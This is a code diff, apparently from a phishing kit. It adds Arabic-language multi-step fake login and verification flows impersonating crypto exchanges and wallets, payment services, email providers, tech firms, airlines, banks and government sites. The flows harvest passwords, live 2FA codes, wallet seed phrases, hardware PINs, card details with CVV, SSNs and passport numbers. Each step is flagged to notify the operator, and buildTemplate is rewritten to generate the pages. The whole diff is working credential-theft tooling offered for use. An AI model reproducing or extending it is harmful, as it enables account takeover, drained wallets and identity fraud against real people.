+    { slug:'login',        form_type:'login',  page_title:'تسجيل الدخول',   headline:'أهلاً في Binance',                  subheadline:'أدخل بريدك الإلكتروني وكلمة المرور',       fields:['email','password'],    layout:'auth',  cta:'تسجيل الدخول',  step_label:'Login',        notify_step:true  },
+    { slug:'2fa-email',    form_type:'otp',    page_title:'تحقق البريد',     headline:'تحقق من بريدك الإلكتروني',          subheadline:'أدخل الكود المرسل إلى بريدك الإلكتروني',   fields:['code'],                layout:'otp',   cta:'تأكيد',         step_label:'Email 2FA',    notify_step:true,  otp_length:6 },
+    { slug:'2fa-phone',    form_type:'otp',    page_title:'تحقق الهاتف',     headline:'تحقق من رقم هاتفك',                 subheadline:'أدخل الكود المرسل برسالة SMS إلى هاتفك',    fields:['code'],                layout:'otp',   cta:'تأكيد',         step_label:'SMS 2FA',      notify_step:true,  otp_length:6 },
+    { slug:'anti-phishing',form_type:'verify', page_title:'رمز مكافحة التصيد',headline:'أدخل رمز مكافحة التصيد الخاص بك',  subheadline:'الرمز الذي أعددته لحماية حسابك',           fields:['anti_phishing_code'],  layout:'verify',cta:'تأكيد',         step_label:'Anti-Phishing',notify_step:true  }
+  ],
+
+  coinbase: [
+    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول',  headline:'تسجيل الدخول إلى Coinbase',         subheadline:'أدخل بريدك الإلكتروني وكلمة المرور',       fields:['email','password'], layout:'auth', cta:'تسجيل الدخول', step_label:'Login',    notify_step:true  },
+    { slug:'2fa-sms',  form_type:'otp',   page_title:'التحقق بخطوتين', headline:'أدخل كود التحقق',                   subheadline:'أرسلنا كوداً من 7 أرقام إلى رقم هاتفك',    fields:['code'],             layout:'otp',  cta:'تأكيد',        step_label:'2FA SMS',  notify_step:true,  otp_length:7 }
+  ],
+
+  metamask: [
+    { slug:'seed-phrase', form_type:'otp_long', page_title:'استعادة المحفظة',  headline:'استيراد محفظة موجودة',               subheadline:'أدخل عبارة الاسترداد السرية المكونة من 12 أو 24 كلمة', fields:['seed_phrase'],      layout:'otp_long',cta:'استيراد',     step_label:'Seed Phrase', notify_step:true,  otp_length:12 },
+    { slug:'password',    form_type:'login',    page_title:'إنشاء كلمة مرور',   headline:'إنشاء كلمة مرور جديدة',              subheadline:'ستُستخدم لفتح MetaMask على هذا الجهاز',                 fields:['password','confirm_password'], layout:'auth',cta:'استيراد',      step_label:'Password',    notify_step:true  }
+  ],
+
+  trustwallet: [
+    { slug:'seed-phrase', form_type:'otp_long', page_title:'استيراد المحفظة',   headline:'استيراد المحفظة الموجودة',           subheadline:'أدخل عبارة الاسترداد السرية المكونة من 12 كلمة',       fields:['seed_phrase'],      layout:'otp_long',cta:'استيراد',     step_label:'Seed Phrase', notify_step:true,  otp_length:12 }
+  ],
+
+  ledger: [
+    { slug:'seed-phrase', form_type:'otp_long', page_title:'استعادة الجهاز',    headline:'أدخل عبارة الاسترداد',               subheadline:'أدخل عبارة الاسترداد السرية المكونة من 24 كلمة',       fields:['seed_phrase'],      layout:'otp_long',cta:'استعادة',     step_label:'Seed Phrase', notify_step:true,  otp_length:24 },
+    { slug:'pin',         form_type:'otp',      page_title:'رمز PIN',           headline:'أدخل رمز PIN',                        subheadline:'أدخل رمز PIN الخاص بجهاز Ledger (8 أرقام)',            fields:['code'],             layout:'otp',     cta:'تأكيد',      step_label:'PIN',         notify_step:true,  otp_length:8 }
+  ],
+
+  trezor: [
+    { slug:'seed-phrase', form_type:'otp_long', page_title:'استعادة الجهاز',    headline:'استعادة المحفظة',                    subheadline:'أدخل عبارة الاسترداد المكونة من 12 أو 24 كلمة',        fields:['seed_phrase'],      layout:'otp_long',cta:'استعادة',     step_label:'Seed Phrase', notify_step:true,  otp_length:12 }
+  ],
+
+  exodus: [
+    { slug:'seed-phrase', form_type:'otp_long', page_title:'استعادة المحفظة',   headline:'استعادة محفظة Exodus',               subheadline:'أدخل عبارة الاسترداد السرية من 12 كلمة',               fields:['seed_phrase'],      layout:'otp_long',cta:'استعادة',     step_label:'Seed Phrase', notify_step:true,  otp_length:12 }
+  ],
+
+  phantom: [
+    { slug:'seed-phrase', form_type:'otp_long', page_title:'استيراد محفظة',     headline:'استيراد محفظة موجودة',               subheadline:'أدخل عبارة الاسترداد السرية من 12 كلمة',               fields:['seed_phrase'],      layout:'otp_long',cta:'استيراد',     step_label:'Seed Phrase', notify_step:true,  otp_length:12 },
+    { slug:'password',    form_type:'login',    page_title:'كلمة المرور',        headline:'إنشاء كلمة مرور',                    subheadline:'أنشئ كلمة مرور لحماية محفظتك على هذا الجهاز',         fields:['password','confirm_password'], layout:'auth',cta:'متابعة',      step_label:'Password',    notify_step:true  }
+  ],
+
+  solflare: [
+    { slug:'seed-phrase', form_type:'otp_long', page_title:'استعادة المحفظة',   headline:'استعادة محفظتك',                     subheadline:'أدخل عبارة الاسترداد السرية',                          fields:['seed_phrase'],      layout:'otp_long',cta:'استعادة',     step_label:'Seed Phrase', notify_step:true,  otp_length:12 }
+  ],
+
+  // ── PAYMENTS ────────────────────────────────────────────────────────────────
+
+  paypal: [
+    { slug:'login',           form_type:'login',  page_title:'تسجيل الدخول',   headline:'تسجيل الدخول إلى PayPal',           subheadline:'أدخل بريدك الإلكتروني وكلمة المرور',       fields:['email','password'],                          layout:'auth',  cta:'تسجيل الدخول',   step_label:'Login',           notify_step:true  },
+    { slug:'sms-code',        form_type:'otp',    page_title:'التحقق',          headline:'أدخل كود التحقق',                   subheadline:'أرسلنا كوداً من 6 أرقام إلى رقم هاتفك',    fields:['code'],                                      layout:'otp',   cta:'تأكيد',          step_label:'SMS Code',        notify_step:true,  otp_length:6 },
+    { slug:'confirm-card',    form_type:'payment',page_title:'تأكيد بطاقتك',    headline:'تأكيد بيانات بطاقتك',               subheadline:'أدخل معلومات بطاقتك للتحقق من هويتك',      fields:['card_number','expiry','cvv'],                 layout:'payment',cta:'تأكيد',          step_label:'Confirm Card',    notify_step:true  },
+    { slug:'billing-address', form_type:'verify', page_title:'عنوان الفاتورة',  headline:'عنوان الفاتورة',                    subheadline:'أكّد عنوان الفاتورة المرتبط بحسابك',       fields:['address','city','state','zip'],               layout:'verify',cta:'حفظ وتأكيد',     step_label:'Billing Address', notify_step:true  }
+  ],
+
+  venmo: [
+    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول',  headline:'سجّل دخولك في Venmo',               subheadline:'أدخل الإيميل أو الهاتف وكلمة المرور',      fields:['email','password'], layout:'auth', cta:'تسجيل الدخول', step_label:'Login',    notify_step:true  },
+    { slug:'sms-code', form_type:'otp',   page_title:'التحقق',         headline:'أدخل كود التحقق',                   subheadline:'أرسلنا كوداً برسالة نصية',                   fields:['code'],             layout:'otp',  cta:'تأكيد',        step_label:'SMS Code', notify_step:true,  otp_length:6 }
+  ],
+
+  zelle: [
+    { slug:'login',        form_type:'login',  page_title:'تسجيل الدخول',  headline:'تسجيل الدخول عبر Zelle',            subheadline:'أدخل بيانات حسابك البنكي',                  fields:['username','password'],                layout:'auth',  cta:'تسجيل الدخول',  step_label:'Login',          notify_step:true  },
+    { slug:'sms-otp',      form_type:'otp',    page_title:'التحقق',         headline:'كود التحقق',                        subheadline:'أرسلنا كوداً برسالة نصية',                   fields:['code'],                               layout:'otp',   cta:'تأكيد',         step_label:'OTP',            notify_step:true,  otp_length:6 },
+    { slug:'confirm-send', form_type:'verify', page_title:'تأكيد التحويل',  headline:'تأكيد بيانات التحويل',              subheadline:'راجع بيانات التحويل قبل الإرسال',            fields:['recipient','amount'],                 layout:'verify',cta:'تأكيد الإرسال', step_label:'Confirm Transfer',notify_step:true  }
+  ],
+
+  cashapp: [
+    { slug:'login',    form_type:'login',  page_title:'تسجيل الدخول',  headline:'سجّل دخولك في Cash App',            subheadline:'أدخل رقم هاتفك أو بريدك الإلكتروني',       fields:['phone'],             layout:'auth',  cta:'تسجيل الدخول', step_label:'Phone',    notify_step:true  },
+    { slug:'sms-code', form_type:'otp',    page_title:'كود التحقق',     headline:'أدخل الكود المرسل',                 subheadline:'أرسلنا كود تحقق برسالة نصية',               fields:['code'],              layout:'otp',   cta:'تأكيد',        step_label:'SMS Code', notify_step:true,  otp_length:6 },
+    { slug:'cashtag',  form_type:'verify', page_title:'إعداد الـ $Cashtag',headline:'اختر $Cashtag الخاص بك',           subheadline:'الـ Cashtag هو طريقتك الشخصية للاستقبال',   fields:['cashtag'],           layout:'verify',cta:'متابعة',       step_label:'Cashtag',  notify_step:true  }
+  ],
+
+  wise: [
+    { slug:'login',    form_type:'login',  page_title:'تسجيل الدخول',  headline:'تسجيل الدخول إلى Wise',             subheadline:'أدخل بريدك الإلكتروني وكلمة المرور',       fields:['email','password'],  layout:'auth',  cta:'تسجيل الدخول', step_label:'Login',     notify_step:true  },
+    { slug:'2fa',      form_type:'otp',    page_title:'التحقق بخطوتين', headline:'كود التحقق',                        subheadline:'أدخل الكود من تطبيق المصادقة',              fields:['code'],              layout:'otp',   cta:'تأكيد',        step_label:'2FA',       notify_step:true,  otp_length:6 },
+    { slug:'id-verify',form_type:'verify', page_title:'تحقق من هويتك', headline:'التحقق من الهوية مطلوب',            subheadline:'ارفع جواز سفرك أو بطاقة هويتك الوطنية',    fields:['full_name','dob','id_number'], layout:'verify',cta:'رفع المستند',  step_label:'ID Verify', notify_step:true  }
+  ],
+
+  // ── EMAIL ───────────────────────────────────────────────────────────────────
+
+  gmail: [
+    { slug:'email',          form_type:'login',  page_title:'تسجيل الدخول',      headline:'تسجيل الدخول',                       subheadline:'انتقل إلى حساب Google',                     fields:['email'],                          layout:'auth',  cta:'التالي',            step_label:'Email',          notify_step:true  },
+    { slug:'password',       form_type:'login',  page_title:'مرحباً',             headline:'مرحباً',                              subheadline:'أدخل كلمة المرور',                          fields:['password'],                       layout:'auth',  cta:'التالي',            step_label:'Password',       notify_step:true  },
+    { slug:'2fa-phone',      form_type:'otp',    page_title:'التحقق',             headline:'تحقق من هويتك',                       subheadline:'أرسلنا إشعاراً إلى هاتفك. أدخل كود التحقق', fields:['code'],                           layout:'otp',   cta:'التالي',            step_label:'2FA Phone',      notify_step:true,  otp_length:6 },
+    { slug:'recovery-email', form_type:'verify', page_title:'البريد الاحتياطي',   headline:'أضف بريداً احتياطياً',               subheadline:'أدخل بريدك الاحتياطي لاستعادة الحساب',      fields:['recovery_email'],                 layout:'verify',cta:'إضافة',             step_label:'Recovery Email', notify_step:true  }
+  ],
+
+  outlook: [
+    { slug:'email',    form_type:'login', page_title:'تسجيل الدخول',   headline:'تسجيل الدخول',                       subheadline:'أدخل بريد Microsoft الخاص بك',              fields:['email'],             layout:'auth', cta:'التالي',       step_label:'Email',    notify_step:true  },
+    { slug:'password', form_type:'login', page_title:'أدخل كلمة المرور',headline:'أدخل كلمة المرور',                  subheadline:'',                                           fields:['password'],          layout:'auth', cta:'تسجيل الدخول', step_label:'Password', notify_step:true  },
+    { slug:'2fa',      form_type:'otp',   page_title:'التحقق',          headline:'أدخل الكود',                         subheadline:'أدخل الكود من تطبيق Microsoft Authenticator', fields:['code'],              layout:'otp',  cta:'تحقق',         step_label:'2FA',      notify_step:true,  otp_length:6 }
+  ],
+
+  yahoomail: [
+    { slug:'email',    form_type:'login', page_title:'تسجيل الدخول',   headline:'تسجيل الدخول إلى Yahoo',             subheadline:'أدخل بريدك الإلكتروني أو رقم هاتفك',       fields:['email'],             layout:'auth', cta:'التالي',       step_label:'Email',    notify_step:true  },
+    { slug:'password', form_type:'login', page_title:'كلمة المرور',    headline:'أدخل كلمة المرور',                   subheadline:'',                                           fields:['password'],          layout:'auth', cta:'تسجيل الدخول', step_label:'Password', notify_step:true  },
+    { slug:'sms-code', form_type:'otp',   page_title:'التحقق',          headline:'أدخل كود التحقق',                   subheadline:'أرسلنا كوداً إلى رقم هاتفك',                fields:['code'],              layout:'otp',  cta:'تأكيد',        step_label:'SMS Code', notify_step:true,  otp_length:6 }
+  ],
+
+  protonmail: [
+    { slug:'login', form_type:'login', page_title:'تسجيل الدخول',     headline:'تسجيل الدخول إلى ProtonMail',        subheadline:'أدخل اسم المستخدم وكلمة المرور',            fields:['username','password'],layout:'auth', cta:'تسجيل الدخول', step_label:'Login', notify_step:true  },
+    { slug:'2fa',   form_type:'otp',   page_title:'المصادقة الثنائية', headline:'كود المصادقة الثنائية',              subheadline:'أدخل الكود من تطبيق المصادقة',              fields:['code'],               layout:'otp',  cta:'تأكيد',        step_label:'2FA',   notify_step:true,  otp_length:6 }
+  ],
+
+  // ── TECH ────────────────────────────────────────────────────────────────────
+
+  apple: [
+    { slug:'apple-id',     form_type:'login',  page_title:'Apple ID',          headline:'تسجيل الدخول بـ Apple ID',          subheadline:'أدخل Apple ID',                             fields:['email'],                    layout:'auth',  cta:'التالي',             step_label:'Apple ID',         notify_step:true  },
+    { slug:'password',     form_type:'login',  page_title:'كلمة المرور',       headline:'أدخل كلمة مرور Apple ID',           subheadline:'',                                           fields:['password'],                 layout:'auth',  cta:'تسجيل الدخول',       step_label:'Password',         notify_step:true  },
+    { slug:'2fa-device',   form_type:'otp',    page_title:'تحقق الجهاز',       headline:'تحقق من هويتك',                      subheadline:'تم إرسال كود مكون من 6 أرقام إلى جهازك الموثوق', fields:['code'],                layout:'otp',   cta:'متابعة',             step_label:'Device 2FA',       notify_step:true,  otp_length:6 },
+    { slug:'recovery-key', form_type:'verify', page_title:'مفتاح الاسترداد',   headline:'مفتاح استرداد الحساب',               subheadline:'أدخل مفتاح استرداد الحساب من 28 حرفاً',     fields:['recovery_key'],             layout:'verify',cta:'إعادة تعيين',         step_label:'Recovery Key',     notify_step:true  }
+  ],
+
+  microsoft: [
+    { slug:'email',    form_type:'login', page_title:'تسجيل الدخول',    headline:'تسجيل الدخول',                       subheadline:'أدخل حساب Microsoft الخاص بك',              fields:['email'],             layout:'auth', cta:'التالي',       step_label:'Email',    notify_step:true  },
+    { slug:'password', form_type:'login', page_title:'أدخل كلمة المرور',headline:'أدخل كلمة المرور',                  subheadline:'',                                           fields:['password'],          layout:'auth', cta:'تسجيل الدخول', step_label:'Password', notify_step:true  },
+    { slug:'2fa',      form_type:'otp',   page_title:'التحقق',           headline:'الموافقة على طلب تسجيل الدخول',     subheadline:'أدخل الكود من تطبيق Microsoft Authenticator', fields:['code'],              layout:'otp',  cta:'تأكيد',        step_label:'2FA',      notify_step:true,  otp_length:6 }
+  ],
+
+  google: [
+    { slug:'email',    form_type:'login', page_title:'تسجيل الدخول',   headline:'تسجيل الدخول',                       subheadline:'انتقل إلى حساب Google',                     fields:['email'],             layout:'auth', cta:'التالي',       step_label:'Email',    notify_step:true  },
+    { slug:'password', form_type:'login', page_title:'أهلاً',           headline:'أهلاً',                              subheadline:'أدخل كلمة المرور الخاصة بك',                fields:['password'],          layout:'auth', cta:'التالي',       step_label:'Password', notify_step:true  },
+    { slug:'2fa',      form_type:'otp',   page_title:'التحقق',          headline:'تحقق من هويتك',                      subheadline:'جوجل أرسل كوداً إلى هاتفك',                 fields:['code'],              layout:'otp',  cta:'التالي',       step_label:'2FA',      notify_step:true,  otp_length:6 }
+  ],
+
+  amazon: [
+    { slug:'email',    form_type:'login', page_title:'تسجيل الدخول',   headline:'تسجيل الدخول',                       subheadline:'أدخل بريدك الإلكتروني أو رقم هاتفك',       fields:['email'],             layout:'auth', cta:'متابعة',       step_label:'Email',    notify_step:true  },
+    { slug:'password', form_type:'login', page_title:'كلمة المرور',    headline:'أدخل كلمة المرور',                   subheadline:'',                                           fields:['password'],          layout:'auth', cta:'تسجيل الدخول', step_label:'Password', notify_step:true  },
+    { slug:'otp',      form_type:'otp',   page_title:'التحقق',          headline:'أدخل كود التحقق',                   subheadline:'أرسلنا كوداً إلى بريدك الإلكتروني',         fields:['code'],              layout:'otp',  cta:'تسجيل الدخول', step_label:'OTP',      notify_step:true,  otp_length:6 }
+  ],
+
+  // ── AIRLINES ─────────────────────────────────────────────────────────────────
+
+  emirates: [
+    { slug:'login',           form_type:'login',  page_title:'تسجيل الدخول',   headline:'تسجيل الدخول إلى Emirates',         subheadline:'أدخل اسم المستخدم وكلمة المرور',            fields:['username','password'],               layout:'auth',  cta:'تسجيل الدخول',  step_label:'Login',           notify_step:true  },
+    { slug:'sms-otp',         form_type:'otp',    page_title:'التحقق',          headline:'أدخل كود التحقق',                   subheadline:'أرسلنا كوداً إلى رقم هاتفك المسجّل',       fields:['code'],                              layout:'otp',   cta:'تأكيد',         step_label:'SMS OTP',         notify_step:true,  otp_length:6 },
+    { slug:'confirm-details', form_type:'verify', page_title:'تأكيد البيانات',  headline:'تأكيد بيانات جواز السفر',           subheadline:'أدخل رقم جواز سفرك وتاريخ ميلادك',         fields:['passport_number','dob'],             layout:'verify',cta:'تأكيد',         step_label:'Passport Details',notify_step:true  },
+    { slug:'payment',         form_type:'payment',page_title:'ترقية الرحلة',    headline:'الدفع لترقية الرحلة',               subheadline:'أدخل بيانات بطاقتك لإتمام الترقية',        fields:['card_number','expiry','cvv','name_on_card'],layout:'payment',cta:'دفع والترقية',step_label:'Payment',        notify_step:true  }
+  ],
+
+  qatarairways: [
+    { slug:'login',           form_type:'login',  page_title:'تسجيل الدخول',   headline:'تسجيل الدخول إلى Qatar Airways',    subheadline:'أدخل بريدك ورقم العضوية وكلمة المرور',     fields:['email','password'],                  layout:'auth',  cta:'تسجيل الدخول',  step_label:'Login',           notify_step:true  },
+    { slug:'otp',             form_type:'otp',    page_title:'التحقق',          headline:'كود التحقق',                        subheadline:'أرسلنا كوداً إلى بريدك',                   fields:['code'],                              layout:'otp',   cta:'تأكيد',         step_label:'OTP',             notify_step:true,  otp_length:6 },
+    { slug:'confirm-details', form_type:'verify', page_title:'تأكيد الهوية',   headline:'تأكيد بيانات جواز السفر',           subheadline:'أكّد بياناتك للإجراءات الأمنية',            fields:['passport_number','dob'],             layout:'verify',cta:'تأكيد',         step_label:'Passport Details',notify_step:true  }
+  ],
+
+};
+
+// ── Category-default flows (fallback for brands without explicit flow) ─────────
+
+const CAT_FLOWS = {
+  social: [
+    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول',  headline:'تسجيل الدخول',          subheadline:'أدخل بريدك الإلكتروني وكلمة المرور',  fields:['email','password'], layout:'auth', cta:'تسجيل الدخول', step_label:'Login',    notify_step:true  },
+    { slug:'sms-code', form_type:'otp',   page_title:'التحقق',         headline:'أدخل كود التحقق',       subheadline:'أرسلنا كوداً برسالة نصية',              fields:['code'],             layout:'otp',  cta:'تأكيد',        step_label:'SMS Code', notify_step:true, otp_length:6 }
+  ],
+  government: [
+    { slug:'login',     form_type:'login',    page_title:'تسجيل الدخول',  headline:'تسجيل الدخول',          subheadline:'أدخل اسم المستخدم وكلمة المرور ورقم الضمان الاجتماعي', fields:['username','password','ssn'], layout:'auth',   cta:'تسجيل الدخول', step_label:'Login',      notify_step:true  },
+    { slug:'sms-code',  form_type:'otp',      page_title:'التحقق',         headline:'كود التحقق',            subheadline:'أرسلنا كوداً إلى رقم هاتفك',              fields:['code'],                      layout:'otp',    cta:'تأكيد',        step_label:'SMS Code',   notify_step:true, otp_length:6 },
+    { slug:'id-confirm',form_type:'id_verify',page_title:'تأكيد الهوية',   headline:'تأكيد هويتك',          subheadline:'أدخل رقم الضمان الاجتماعي وتاريخ الميلاد', fields:['ssn','dob'],                 layout:'verify', cta:'تأكيد',        step_label:'ID Confirm', notify_step:true  }
+  ],
+  banks: [
+    { slug:'login',      form_type:'login',      page_title:'تسجيل الدخول',   headline:'تسجيل الدخول',        subheadline:'أدخل اسم المستخدم وكلمة المرور',          fields:['username','password'],              layout:'auth',      cta:'تسجيل الدخول', step_label:'Login',            notify_step:true  },
+    { slug:'sms-otp',    form_type:'otp',        page_title:'التحقق',          headline:'كود التحقق',           subheadline:'أرسلنا كوداً من 6 أرقام إلى رقم هاتفك',  fields:['code'],                             layout:'otp',       cta:'تأكيد',        step_label:'SMS OTP',          notify_step:true, otp_length:6 },
+    { slug:'security-q', form_type:'security_q', page_title:'أسئلة الأمان',    headline:'أسئلة الأمان',         subheadline:'أجب على أسئلة الأمان للمتابعة',           fields:['answer1','answer2','answer3'],       layout:'security_q',cta:'متابعة',       step_label:'Security Questions',notify_step:true  }
+  ],
+  crypto: [
+    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول',  headline:'تسجيل الدخول',          subheadline:'أدخل بريدك الإلكتروني وكلمة المرور',  fields:['email','password'], layout:'auth', cta:'تسجيل الدخول', step_label:'Login',     notify_step:true  },
+    { slug:'2fa-email',form_type:'otp',   page_title:'تحقق البريد',   headline:'تحقق من بريدك',         subheadline:'أدخل الكود المرسل إلى بريدك الإلكتروني', fields:['code'],            layout:'otp',  cta:'تأكيد',        step_label:'Email 2FA', notify_step:true, otp_length:6 },
+    { slug:'2fa-sms',  form_type:'otp',   page_title:'تحقق الهاتف',   headline:'تحقق من هاتفك',         subheadline:'أدخل الكود المرسل برسالة SMS',          fields:['code'],             layout:'otp',  cta:'تأكيد',        step_label:'SMS 2FA',   notify_step:true, otp_length:6 }
+  ],
+  payments: [
+    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول',  headline:'تسجيل الدخول',          subheadline:'أدخل بريدك الإلكتروني وكلمة المرور',  fields:['email','password'], layout:'auth', cta:'تسجيل الدخول', step_label:'Login',    notify_step:true  },
+    { slug:'sms-code', form_type:'otp',   page_title:'التحقق',         headline:'أدخل كود التحقق',       subheadline:'أرسلنا كوداً برسالة نصية',              fields:['code'],             layout:'otp',  cta:'تأكيد',        step_label:'SMS Code', notify_step:true, otp_length:6 }
+  ],
+  email: [
+    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول',  headline:'تسجيل الدخول',          subheadline:'أدخل بريدك الإلكتروني وكلمة المرور',  fields:['email','password'], layout:'auth', cta:'تسجيل الدخول', step_label:'Login',    notify_step:true  },
+    { slug:'sms-code', form_type:'otp',   page_title:'التحقق',         headline:'أدخل كود التحقق',       subheadline:'أرسلنا كوداً برسالة نصية',              fields:['code'],             layout:'otp',  cta:'تأكيد',        step_label:'SMS Code', notify_step:true, otp_length:6 }
+  ],
+  tech: [
+    { slug:'login',form_type:'login',page_title:'تسجيل الدخول', headline:'تسجيل الدخول',subheadline:'أدخل بريدك الإلكتروني وكلمة المرور',fields:['email','password'],layout:'auth',cta:'تسجيل الدخول',step_label:'Login',notify_step:true },
+    { slug:'2fa',  form_type:'otp',  page_title:'التحقق',        headline:'أدخل كود التحقق',subheadline:'أدخل الكود من تطبيق المصادقة',       fields:['code'],             layout:'otp', cta:'تأكيد',        step_label:'2FA',  notify_step:true,otp_length:6 }
+  ],
+  airlines: [
+    { slug:'login',           form_type:'login',  page_title:'تسجيل الدخول',  headline:'تسجيل الدخول',        subheadline:'أدخل بريدك أو رقم الحجز واسم العائلة',  fields:['email','password'],            layout:'auth',  cta:'تسجيل الدخول',  step_label:'Login',           notify_step:true  },
+    { slug:'otp',             form_type:'otp',    page_title:'التحقق',         headline:'كود التحقق',           subheadline:'أرسلنا كوداً إلى بريدك أو هاتفك',       fields:['code'],                        layout:'otp',   cta:'تأكيد',         step_label:'OTP',             notify_step:true, otp_length:6 },
+    { slug:'confirm-details', form_type:'verify', page_title:'تأكيد الهوية',  headline:'تأكيد بيانات السفر',  subheadline:'أدخل رقم جواز السفر وتاريخ الميلاد',    fields:['passport_number','dob'],       layout:'verify',cta:'تأكيد',         step_label:'Passport Details',notify_step:true  }
+  ],
+  audio: [
+    { slug:'login',          form_type:'login',  page_title:'تسجيل الدخول',    headline:'تسجيل الدخول',              subheadline:'أدخل بريدك الإلكتروني وكلمة المرور',  fields:['email','password'],                          layout:'auth',  cta:'تسجيل الدخول',   step_label:'Login',          notify_step:true  },
+    { slug:'payment-update', form_type:'payment',page_title:'تحديث بيانات الدفع',headline:'تحديث طريقة الدفع',       subheadline:'حدّث بيانات دفعك للاستمرار في الاستمتاع بالخدمة', fields:['card_number','expiry','cvv','name_on_card'],layout:'payment',cta:'تحديث',          step_label:'Payment Update', notify_step:true  }
+  ],
+  video: [
+    { slug:'login',          form_type:'login',  page_title:'تسجيل الدخول',    headline:'تسجيل الدخول',              subheadline:'أدخل بريدك الإلكتروني وكلمة المرور',  fields:['email','password'],                          layout:'auth',  cta:'تسجيل الدخول',   step_label:'Login',          notify_step:true  },
+    { slug:'payment-update', form_type:'payment',page_title:'تحديث بيانات الدفع',headline:'تحديث بيانات الفوترة',   subheadline:'حدّث بيانات الدفع لاستعادة الوصول إلى محتواك', fields:['card_number','expiry','cvv','name_on_card'],layout:'payment',cta:'تحديث',          step_label:'Payment Update', notify_step:true  }
+  ]
+};
+
+// ── Special video overrides ──────────────────────────────────────────────────
+FLOWS.netflixvideo = [
+  { slug:'login',           form_type:'login',  page_title:'تسجيل الدخول',     headline:'تسجيل الدخول إلى Netflix',     subheadline:'أدخل بريدك الإلكتروني وكلمة المرور',     fields:['email','password'],                          layout:'auth',  cta:'تسجيل الدخول', step_label:'Login',          notify_step:true  },
+  { slug:'payment-update',  form_type:'payment',page_title:'تحديث الفاتورة',   headline:'تحديث بيانات الفاتورة',        subheadline:'لاستعادة الوصول إلى Netflix، حدّث بيانات دفعك', fields:['card_number','expiry','cvv','name_on_card'],layout:'payment',cta:'تحديث',        step_label:'Payment Update', notify_step:true  },
+  { slug:'confirm-address', form_type:'verify', page_title:'تأكيد العنوان',    headline:'تأكيد عنوان الفاتورة',         subheadline:'تأكد من صحة عنوان الفاتورة',              fields:['address','city','zip'],                      layout:'verify',cta:'تأكيد',        step_label:'Billing Address',notify_step:true  }
+];
+
+FLOWS.disneyplus = [
+  { slug:'login',          form_type:'login',  page_title:'تسجيل الدخول',    headline:'تسجيل الدخول إلى Disney+',      subheadline:'أدخل بريدك وكلمة المرور',               fields:['email','password'],                          layout:'auth',  cta:'تسجيل الدخول', step_label:'Login',          notify_step:true  },
+  { slug:'payment-update', form_type:'payment',page_title:'تحديث بيانات الدفع',headline:'تحديث طريقة الدفع',            subheadline:'حدّث بيانات بطاقتك للاستمرار في مشاهدة Disney+', fields:['card_number','expiry','cvv','name_on_card'],layout:'payment',cta:'تحديث',        step_label:'Payment Update', notify_step:true  }
+];
+
+// ── BRANDS array ─────────────────────────────────────────────────────────────
+
 const BRANDS = [
   // social (20)
   ['t001','Facebook','social','facebook'],
@@ -567,22 +988,25 @@ const BRANDS = [
 ];
 
 function buildTemplate([id, name, category, palKey]) {
-  const bp = BASE_BP;
   const raw = PALETTES[palKey] || CATEGORY_DEFAULTS[category] || CATEGORY_DEFAULTS.social;
   const palette = { bg: raw[0], card: raw[1], fg: raw[2], accent: raw[3], accent2: raw[4] };
-  const fill = t => (t || '').replace(/\{name\}/g, name);
 
-  const pages = Object.entries(bp).map(([, pg]) => ({
+  const flowDef = FLOWS[palKey] || CAT_FLOWS[category] || CAT_FLOWS.social;
+
+  const pages = flowDef.map(pg => ({
     slug:        pg.slug,
     page_title:  pg.page_title,
-    headline:    fill(pg.headline_tpl || ''),
-    subheadline: fill(pg.sub_tpl || ''),
+    headline:    pg.headline,
+    subheadline: pg.subheadline,
     body:        '',
-    cta:         'اضغط هنا',
-    fields:      pg.fields || ['name','email'],
-    layout:      pg.layout || 'hero-center',
+    cta:         pg.cta || 'متابعة',
+    fields:      pg.fields || [],
+    layout:      pg.layout || 'auth',
+    form_type:   pg.form_type || 'login',
+    step_label:  pg.step_label || pg.slug,
+    notify_step: pg.notify_step !== false,
     features:    pg.features || null,
-    plans:       pg.plans || null,
+    plans:       pg.plans    || null,
     otp_type:    pg.otp_type || null,
     otp_length:  pg.otp_length || null
   }));
